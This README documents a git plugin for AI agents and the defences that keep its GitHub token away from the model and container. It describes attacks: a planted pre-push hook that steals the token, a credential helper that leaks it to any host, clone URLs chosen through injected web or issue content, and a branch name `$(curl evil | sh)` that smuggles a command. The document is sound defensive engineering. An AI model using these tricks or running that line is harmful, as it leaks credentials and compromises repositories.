# `@loopingai/plugins/repo`

Clone, commit, push a work branch, open a pull request.

```ts
import { repo } from "@loopingai/plugins/repo";
import { computerExec } from "@loopingai/plugins/computer";

repo({
  exec: computerExec({ binding: env.WORKSPACE, workspaceName: () => name }),
  token: () => env.GITHUB_TOKEN
});
```

Tools: `repo_clone`, `repo_status`, `repo_diff`, `repo_commit`, `repo_push`,
`repo_open_pr`.

`exec` is injected rather than importing [`/computer`](../computer/) directly, so
the two stay independent — a host with its own container can use this against that,
and the tests need no container at all. `computerExec` is that plugin's side of the
same seam; anything with the signature above works.

## Where the token lives

Nowhere the model or the container can read it:

- **Never in a repository the model can configure.** Git executes what
  `.git/config` and `.git/hooks` tell it to, both live in the workspace
  filesystem, and a co-installed shell tool can write them — so a planted
  `pre-push` hook ran on an ordinary `repo_push` and read the token straight out
  of the environment it inherited. Patching that key by key does not work
  either: a URL-specific `http.<url>.sslVerify=false` in the repository's own
  config beats a `-c` override, because specificity outranks precedence. So
  `clone`, `fetch` and `push` run in a bare git dir created per operation, whose
  entire configuration is what `git init` wrote and whose whole config is given
  on the command line — the one channel nothing in the container can rewrite
  underneath us. The checkout's objects are reached through an alternates file,
  so nothing is copied.
- **Never in a command string.** A command line is echoed into stdout, into
  stderr on failure, into shell history, and into any VCR cassette. The token
  goes through `exec`'s per-command `env`, and `git` reads it back via a
  credential helper. Embedding it in the remote URL — the obvious alternative —
  writes it into `.git/config`, where it survives the command.
- **Never offered to a host you did not allow.** This is the one that is easy to
  miss. A helper installed as plain `credential.helper` answers for _every_ host
  — it never sees which one git is asking about — so a clone URL pointing
  anywhere makes git hand the token over the moment that server replies `401`.
  And the clone URL is model input: a repository README, an issue body, or a page
  a co-installed browser plugin fetched is enough to choose it. So the helper is
  bound to `credential.<origin>.helper`, and the URL's host must be on
  `allowedHosts` (default: `github.com`) before anything runs at all.
- **Pull requests are opened from the Worker.** The GitHub REST call happens on
  the Worker side, so the credential that can write to the repository through
  the API never crosses into the container at all.

The same mechanism carries every **model-authored** value — URLs, branch names,
commit messages — as an environment variable rather than interpolating it into a
command, so a branch name of `$(curl evil | sh)` is inert text.

What remains is not zero. The model has a root shell in the same filesystem, so
it can still race a write against the isolated dir between the command that
creates it and the command that uses it. What the arrangement above removes is
the durable form of that attack — plant once, collect on every future push — and
what is left has to win a race inside a single turn. Removing the rest means not
doing authenticated git in the container at all, i.e. pushing from the Worker
over the forge's API.

## Guardrails are in the tool, not the prompt

`repo_push` refuses, before running anything, in three layers — a guardrail a
model can talk itself out of is not a guardrail:

1. **Anything that is not a plain branch name.** `git push origin <name>` reads
   `<name>` as a _refspec_, so `+x:main` is a force push to main and `x:main` an
   ordinary one — neither of which a list of forbidden names ever sees, because
   it only compares literal strings.
2. **`main`, `master`, `trunk`, `develop`.**
3. **The repository's own default branch**, read from the remote. A repo whose
   trunk is `release` deserves the same protection, and only the remote can say.

It then refuses a fourth thing, after switching to the branch: **a branch with no
commits the default branch does not already have.** Pushing one succeeds,
`repo_open_pr` opens an empty pull request on it, and the round reports a URL as
if the work had landed — the one outcome worse than an error.

`repo_push` **switches to** an existing branch and only creates a missing one. It
used to use `git checkout -B`, which is create-or-_reset_, and that destroyed a
real commit: a model committed, saved the commit with `git branch coder/x`, then
went back to the default branch and reset — and `checkout -B` force-moved
`coder/x` back to where HEAD now was.

`repo_clone` is re-entrant, because a container that outlives its task comes back
with the checkout still in it. It fetches and resets a clean one, and **refuses a
dirty one** rather than resetting over the top: those changes are a previous
task's work, and discarding them is the one outcome nobody can undo.

## Output is bounded

Every tool truncates from the middle at `maxOutputBytes` (16 KB by default), the
same way `sb_exec` does. `repo_diff` also takes `stat: true` for a per-file
changed-line summary — the right first call on a large change, and the only
practical one for an agent whose entire view of the work is the diff.

## Requirements

A `GITHUB_TOKEN` secret with contents + pull-request write, and a container with
`git` on it.
